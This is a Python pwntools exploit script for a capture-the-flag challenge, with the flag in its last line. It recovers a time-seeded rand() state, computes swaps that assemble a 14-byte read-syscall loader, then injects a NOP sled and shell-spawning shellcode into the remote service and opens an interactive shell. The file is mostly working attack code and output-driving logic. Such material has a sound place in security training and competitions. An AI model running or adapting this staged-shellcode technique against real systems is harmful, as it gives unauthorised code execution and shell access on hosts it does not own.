from pwn import *
import ctypes
import time

context.arch = 'amd64'
context.log_level = 'info'

try:
    libc = ctypes.CDLL("libc.so.6")
except:
    libc = ctypes.CDLL("libc.so")

# --- Exploitation Strategy ---
# Stage 1: The Loader (14 bytes)
# We need to construct a hand that executes a read(0, board, 255) syscall.
# Constraints: 14 bytes max.
# Trick: memcpy() returns the destination address in RAX. We copy RAX to RSI.
#
# Assembly:
#   mov rsi, rax   ; (3 bytes) RSI = Board Address (0x13370000)
#   xor eax, eax   ; (2 bytes) RAX = 0 (SYS_read)
#   xor edi, edi   ; (2 bytes) RDI = 0 (stdin)
#   xor edx, edx   ; (2 bytes) Clear RDX
#   mov dl, 0xff   ; (2 bytes) RDX = 255 (Count)
#   syscall        ; (2 bytes) Perform read
#   nop            ; (1 byte)  Padding/Slide
TARGET_BYTES = b"\x48\x89\xc6\x31\xc0\x31\xff\x31\xd2\xb2\xff\x0f\x05\x90"

def solve():
    io = remote('chall.lac.tf', 31338)

    # --- 1. Synchronize RNG ---
    print("[*] Synchronizing RNG...")
    io.recvuntil(b"Tiles: 14")
    io.recvuntil(b"starting tiles:\n")
    io.recvline() 
    
    # Parse the visual table to get initial bytes
    hex_line = io.recvline().decode().strip()
    parts = hex_line.split('|')
    initial_hand = [int(p.strip(), 16) for p in parts if p.strip()]
            
    print(f"[*] Server Hand: {initial_hand}")

    # Brute-force the seed based on current time
    now = int(time.time())
    seed = 0
    found = False
    
    # Check a window of +/- 60 seconds
    for t in range(now - 60, now + 60):
        libc.srand(t)
        test_hand = []
        for _ in range(14):
            test_hand.append(libc.rand() & 0xFF)
        
        if test_hand == initial_hand:
            seed = t
            print(f"[+] Found Seed: {seed}")
            found = True
            break
            
    if not found:
        print("[-] Seed not found. Check your system clock or libc version.")
        io.close()
        return

    # --- 2. Offline Simulation (Pipelining) ---
    print("[*] Calculating swap sequence offline...")
    
    current_hand = list(initial_hand)
    target_hand = list(TARGET_BYTES)
    
    # We will buffer all commands here to send in one go
    commands_buffer = []

    # Simulation loop
    while current_hand != target_hand:
        # Predict next random byte
        next_val = libc.rand() & 0xFF
        
        # Coupon Collector Logic: Where does this byte fit?
        candidate_idx = -1
        
        # 1. Look for a slot that needs this byte and is currently wrong
        for i in range(14):
            if current_hand[i] != target_hand[i] and target_hand[i] == next_val:
                candidate_idx = i
                break
        
        # 2. If useless, burn it on a slot that is already wrong
        if candidate_idx == -1:
            for i in range(14):
                if current_hand[i] != target_hand[i]:
                    candidate_idx = i
                    break
        
        # If still -1, the hand is complete
        if candidate_idx == -1:
            break

        # Record the command
        # "1" to swap, then the index
        commands_buffer.append(b"1")
        commands_buffer.append(str(candidate_idx).encode())
        
        # Update local state
        current_hand[candidate_idx] = next_val

    print(f"[+] Sequence calculated: {len(commands_buffer)//2} swaps required.")
    
    # Add the final "Play" command (Option 2)
    commands_buffer.append(b"2")

    # --- 3. Attack ---
    print("[*] Blasting batched commands...")
    
    # Join with newlines to simulate sequential inputs
    payload_stream = b"\n".join(commands_buffer) + b"\n"
    
    # Send everything at once
    io.send(payload_stream)

    # --- 4. Payload Injection ---
    print("[*] Waiting for execution...")
    
    # The server will process all swaps and then run the code.
    # We wait for the signal that code is running.
    io.recvuntil(b"TRIPLE WORD SCORE!\n")
    
    print("[*] Sending Stage 2 Shellcode...")
    
    # Stage 2: NOP Sled + Shellcode
    # Explanation:
    # 1. The Stage 1 'syscall' instruction is at offset 11 (2 bytes long).
    # 2. When 'syscall' finishes (after reading our input), RIP moves to offset 13.
    # 3. Our 'read' overwrites the board starting at offset 0.
    # 4. We send 13 bytes of NOPs so that index 13 contains a NOP (or start of shellcode).
    # 5. Execution slides from offset 13 into our shellcode.
    
    padding = b"\x90" * 13
    shellcode = asm(shellcraft.sh())
    
    io.send(padding + shellcode)
    
    # --- 5. Interact ---
    io.interactive()

if __name__ == "__main__":
    solve()
# lactf{gg_y0u_sp3ll3d_sh3llc0d3}